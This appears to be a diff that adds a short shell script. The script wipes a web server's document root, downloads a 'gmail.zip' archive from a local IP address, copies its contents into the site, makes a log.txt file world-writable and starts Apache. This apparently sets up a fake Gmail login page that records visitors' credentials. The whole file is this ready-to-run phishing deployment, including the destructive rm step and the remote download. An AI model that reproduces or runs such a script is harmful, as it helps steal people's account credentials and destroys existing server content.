@@ -1,0 +1,18 @@
+cd /var/www/html
+
+rm *.*
+
+wget http://192.168.0.122/tools/gmail.zip
+
+unzip gmail.zip
+
+cd Gmail.com
+
+cp * ../
+
+cd ..
+
+chmod 777 log.txt
+
+service apache2 start
+
